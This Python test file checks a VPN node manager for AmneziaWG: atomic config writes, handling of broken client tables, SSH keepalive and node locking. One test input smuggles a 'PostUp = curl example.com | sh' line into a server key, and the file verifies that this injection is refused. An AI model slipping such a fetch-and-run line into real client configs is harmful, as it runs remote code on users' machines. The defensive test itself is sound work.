"""Записи на ноде AWG и данные, которые нода отдает в конфиг клиента.

- clientsTable и awg0.conf пишутся через временный файл и mv: на полном диске
  `cat >` оставлял файл в 0 байт (awg0.conf - интерфейс не поднимется);
- непустая, но неразбираемая clientsTable - ошибка, а не []: иначе следующая
  выдача записала бы таблицу из одного клиента и имена остальных пропали бы;
- ключ сервера и PSK с ноды - строго base64 на 32 байта: иначе враждебная нода
  вставляла в конфиг клиента секцию [Interface] с PostUp;
- адреса клиентов на паузе читаются и пишутся под блокировкой ноды.
"""

import base64

import httpx
import pytest

from app import awg, nodelock, pausestore, sshops
from app.api import awg as awg_api

KEY = base64.b64encode(bytes(range(32))).decode()
PSK = base64.b64encode(bytes(range(1, 33))).decode()


class _Result:
    def __init__(self, stdout: str = "", exit_status: int = 0):
        self.stdout = stdout
        self.stderr = ""
        self.exit_status = exit_status


class _Conn:
    def __init__(self, by_substring: dict | None = None):
        self.by_substring = by_substring or {}
        self.commands: list[str] = []
        self.inputs: list[str | None] = []

    async def run(self, cmd, input=None, check=False):  # noqa: A002
        self.commands.append(cmd)
        self.inputs.append(input)
        for sub, out in self.by_substring.items():
            if sub in cmd:
                return _Result(out)
        return _Result()


# --- _read_table ---------------------------------------------------------------


@pytest.mark.parametrize("text", ["", "\n", "  \n"])
async def test_read_table_empty_or_missing_is_empty_list(text) -> None:
    conn = _Conn({"clientsTable": text})
    assert await awg._read_table(conn, "amnezia-awg2") == []
    # отсутствующий файл - не ошибка cat, а пустой вывод
    assert "if [ -e /opt/amnezia/awg/clientsTable ]" in conn.commands[0]


@pytest.mark.parametrize("text", ["[{\"clientId\": ", "{\"a\": 1}", "garbage", "[null]"])
async def test_read_table_unparseable_refuses(text) -> None:
    conn = _Conn({"clientsTable": text})
    with pytest.raises(awg.AwgError):
        await awg._read_table(conn, "amnezia-awg2")


async def test_read_table_valid() -> None:
    conn = _Conn({"clientsTable": '[{"clientId": "K"}]\n'})
    assert await awg._read_table(conn, "amnezia-awg2") == [{"clientId": "K"}]


async def test_revoke_with_broken_table_touches_nothing() -> None:
    conn = _Conn({"clientsTable": "not json"})
    with pytest.raises(awg.AwgError):
        await awg.revoke_client(conn, "amnezia-awg2", "awg0", KEY)
    assert not any("remove" in c or "cat >" in c for c in conn.commands)


# --- атомарная запись -------------------------------------------------------------


async def test_write_table_via_tmp_and_mv() -> None:
    conn = _Conn()
    await awg._write_table(conn, "amnezia-awg2", [{"clientId": "K"}])
    cmd = conn.commands[0]
    assert "cat > /opt/amnezia/awg/clientsTable.acontrol-tmp && { mv -f" in cmd
    assert '"clientId": "K"' in conn.inputs[0]


async def test_write_file_failure_raises() -> None:
    class Full(_Conn):
        async def run(self, cmd, input=None, check=False):  # noqa: A002
            return _Result("", exit_status=1)

    with pytest.raises(awg.AwgError):
        await awg._write_file(Full(), "amnezia-awg2", "/opt/amnezia/awg/awg0.conf", "x")


async def test_revoke_rewrites_conf_atomically() -> None:
    conf = f"[Interface]\nPrivateKey = {KEY}\n\n[Peer]\nPublicKey = {KEY}\nAllowedIPs = 10.8.1.2/32\n"
    conn = _Conn({"cat /opt/amnezia/awg/awg0.conf": conf, "clientsTable ]": "[]"})
    await awg.revoke_client(conn, "amnezia-awg2", "awg0", KEY)
    writes = [c for c in conn.commands if "cat > " in c]
    assert any("awg0.conf.acontrol-tmp && { mv -f" in c for c in writes)
    assert not any("cat > /opt/amnezia/awg/awg0.conf'" in c for c in writes)


# --- ключи с ноды в конфиге клиента -------------------------------------------------


def _config(server_public=KEY, preshared=PSK) -> str:
    return awg.build_client_config(
        client_private=KEY, address="10.8.1.2", server_public=server_public,
        preshared=preshared, endpoint="203.0.113.5:47180", params={}, dns="1.1.1.1",
    )


def test_valid_keys_pass() -> None:
    assert f"PublicKey = {KEY}" in _config()


@pytest.mark.parametrize("bad", [
    KEY + "\n[Interface]\nPostUp = curl example.com | sh",
    "", "not-base64!", base64.b64encode(b"x" * 31).decode(), KEY.rstrip("=") + "A=",
])
def test_hostile_server_key_refused(bad) -> None:
    with pytest.raises(awg.AwgError):
        _config(server_public=bad)
    with pytest.raises(awg.AwgError):
        _config(preshared=bad)


async def test_create_refuses_hostile_key_before_changing_node() -> None:
    conn = _Conn({"clientsTable": "[]", "wireguard_psk.key": PSK})
    state = awg.AwgState(
        container="amnezia-awg2", interface="awg0", listen_port=47180,
        server_public_key=KEY + "\nPostUp = bad", endpoint="203.0.113.5:47180",
        address="10.8.1.0/24", clients=[],
    )
    with pytest.raises(awg.AwgError):
        await awg.create_client(conn, state, "phone", "1.1.1.1")
    assert not any("wg set" in cmd or "cat >" in cmd for cmd in conn.commands)


# --- keepalive в SSH --------------------------------------------------------------


async def test_connect_sets_keepalive(monkeypatch, tmp_path) -> None:
    seen = {}

    class _C:
        def get_server_host_key(self):
            return None

    async def fake_connect(**kw):
        seen.update(kw)
        return _C()

    monkeypatch.setattr(sshops.asyncssh, "connect", fake_connect)
    await sshops._tofu_connect("203.0.113.5", 22, "root", tmp_path / "id", timeout=5)
    assert seen["keepalive_interval"] > 0 and seen["keepalive_count_max"] > 0


# --- пауза и выдача под одной блокировкой -----------------------------------------


class _DummyConn:
    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        return False


async def _wrap(v):
    return v


def _held(server_id: int) -> bool:
    lk = nodelock._locks.get(("awg", server_id))
    return lk is not None and lk.lock.locked()


async def test_reserved_ips_and_pause_record_under_node_lock(
    client: httpx.AsyncClient, auth_headers, monkeypatch
) -> None:
    r = await client.post("/api/servers", json={"name": "n", "host": "203.0.113.5",
                                                "ssh_port": 22, "ssh_user": "root"},
                          headers=auth_headers)
    sid = r.json()["id"]
    # настоящая блокировка ноды, но без SSH
    monkeypatch.setattr(
        awg_api, "_connect", lambda server: nodelock.connect("awg", server.id, _DummyConn())
    )
    target = awg.AwgClient(name="phone", public_key="PK", address="10.8.1.2/32")
    state = awg.AwgState(
        container="amnezia-awg2", interface="awg0", listen_port=47180,
        server_public_key=KEY, endpoint="203.0.113.5:47180", address="10.8.1.0/24",
        clients=[target],
    )
    monkeypatch.setattr(awg, "read_state", lambda conn, host, container=None: _wrap(state))
    monkeypatch.setattr(awg, "pause_client", lambda conn, st, pk: _wrap({"ip": "10.8.1.2"}))
    held: dict[str, bool] = {}
    real_add, real_ips = pausestore.add, pausestore.paused_ips

    async def add(session, server_id, *a, **kw):
        held["add"] = _held(server_id)
        return await real_add(session, server_id, *a, **kw)

    async def ips(session, server_id, *a, **kw):
        held["ips"] = _held(server_id)
        return await real_ips(session, server_id, *a, **kw)

    monkeypatch.setattr(pausestore, "add", add)
    monkeypatch.setattr(pausestore, "paused_ips", ips)

    r = await client.post(f"/api/servers/{sid}/awg/pause", json={"public_key": "PK"},
                          headers=auth_headers)
    assert r.status_code == 204
    assert held["add"] is True

    got_reserved = {}

    async def create(conn, st, name, dns, fixed_ip=None, reserved=None):
        got_reserved["v"] = reserved
        return awg.AwgClient(name=name, public_key="NEW", address="10.8.1.3/32"), "CONF"

    monkeypatch.setattr(awg, "create_client", create)
    r = await client.post(f"/api/servers/{sid}/awg/clients", json={"name": "x"},
                          headers=auth_headers)
    assert r.status_code == 201
    assert held["ips"] is True
    assert "10.8.1.2" in got_reserved["v"]
